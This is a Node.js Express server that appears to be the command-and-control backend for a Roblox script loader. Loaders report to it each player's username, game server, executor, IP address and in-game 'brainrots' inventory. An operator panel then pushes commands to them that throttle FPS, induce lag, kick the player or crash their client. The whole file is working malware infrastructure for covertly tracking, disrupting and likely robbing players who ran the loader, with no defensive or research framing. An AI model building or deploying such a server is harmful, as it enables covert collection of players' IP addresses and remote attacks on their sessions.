const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// In-memory storage
const players = new Map();
const pastPlayers = new Map();
const commandStates = new Map();
const commandAck = new Map(); // Track if command was received by loader

// Cleanup offline players every 10 seconds
setInterval(() => {
    const now = Date.now();
    for (const [userId, player] of players) {
        if (now - player.lastHeartbeat > 20000) {
            player.online = false;
            pastPlayers.set(userId, player);
            players.delete(userId);
            console.log(`[CLEANUP] Player ${userId} moved to past players`);
        }
    }
}, 10000);

// POST /api/public/heartbeat - Receive player data from loader
app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    console.log(`[HEARTBEAT] Received from user_id: ${data?.user_id}`);

    if (!data || !data.user_id) {
        console.log('[HEARTBEAT] REJECTED: Missing user_id');
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const player = {
        user_id: data.user_id,
        username: data.username || 'Unknown',
        display_name: data.display_name || data.username || 'Unknown',
        avatar_url: data.avatar_url || '',
        place_id: data.place_id || '',
        game_name: data.game_name || 'Unknown Game',
        job_id: data.job_id || '',
        executor: data.executor || 'unknown',
        server_players: data.server_players || [],
        ip_address: data.ip_address || '',
        brainrots: data.brainrots || [],
        lastHeartbeat: Date.now(),
        online: true,
    };

    players.set(data.user_id, player);

    if (!commandStates.has(data.user_id)) {
        commandStates.set(data.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
        commandAck.set(data.user_id, { kick: true, crash: true }); // Mark as "already received" initially
    }

    console.log(`[HEARTBEAT] OK - ${data.user_id} | ${data.username} | Game: ${data.game_name} | Brainrots: ${(data.brainrots || []).length} | IP: ${data.ip_address || 'none'}`);
    res.json({ success: true, message: 'Heartbeat received' });
});

// GET /api/public/command - Send commands to loader
app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    console.log(`[COMMAND POLL] Request from user_id: ${userId}`);

    if (!userId) {
        console.log('[COMMAND POLL] REJECTED: Missing user_id');
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false };
    const ack = commandAck.get(userId) || { kick: true, crash: true };
    const cmd = { ...state };

    console.log(`[COMMAND POLL] Sending to ${userId}:`, JSON.stringify(cmd));

    // Only reset kick/crash if they were already sent once (acked)
    const s = commandStates.get(userId);
    if (s) {
        if (ack.kick && s.kick === false) {
            // Already acked and currently false, keep false
        } else if (s.kick === true) {
            // Will be sent now, mark for reset next time
            ack.kick = true;
        } else if (ack.kick && s.kick === false) {
            ack.kick = false;
        }

        if (ack.crash && s.crash === false) {
            // Already acked and currently false, keep false
        } else if (s.crash === true) {
            // Will be sent now, mark for reset next time
            ack.crash = true;
        } else if (ack.crash && s.crash === false) {
            ack.crash = false;
        }

        // Reset after sending
        if (ack.kick && s.kick) {
            s.kick = false;
            ack.kick = false;
        }
        if (ack.crash && s.crash) {
            s.crash = false;
            ack.crash = false;
        }
    }

    res.json(cmd);
});

// POST /api/command - Panel sends commands to player
app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
    console.log(`[COMMAND RECEIVED] From panel for user_id: ${user_id}`, req.body);

    if (!user_id) {
        console.log('[COMMAND RECEIVED] REJECTED: Missing user_id');
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const state = commandStates.get(user_id);
    if (!state) {
        console.log(`[COMMAND RECEIVED] REJECTED: Player ${user_id} not found`);
        return res.status(404).json({ error: 'Player not found' });
    }

    if (fps_limit !== undefined) state.fps_limit = fps_limit;
    if (lag_n !== undefined) state.lag_n = lag_n;
    if (lag_c !== undefined) state.lag_c = lag_c;
    if (kick === true) {
        state.kick = true;
        commandAck.set(user_id, { ...(commandAck.get(user_id) || {}), kick: false });
    }
    if (crash === true) {
        state.crash = true;
        commandAck.set(user_id, { ...(commandAck.get(user_id) || {}), crash: false });
    }

    console.log(`[COMMAND RECEIVED] OK - Updated state for ${user_id}:`, JSON.stringify(state));
    res.json({ success: true, current_state: state });
});

// GET /api/players - Get all players for panel
app.get('/api/players', (req, res) => {
    const allPlayers = [
        ...Array.from(players.values()),
        ...Array.from(pastPlayers.values()).filter(p => !players.has(p.user_id))
    ];
    console.log(`[PLAYERS LIST] Sending ${allPlayers.length} players`);
    res.json({ players: allPlayers });
});

// GET /api/command_state - Get command state for a player
app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) {
        return res.status(400).json({ error: 'Missing user_id' });
    }

    const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false };
    res.json(state);
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Fallback: serve index.html for root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`[SERVER STARTED] Panel server running on port ${PORT}`);
});
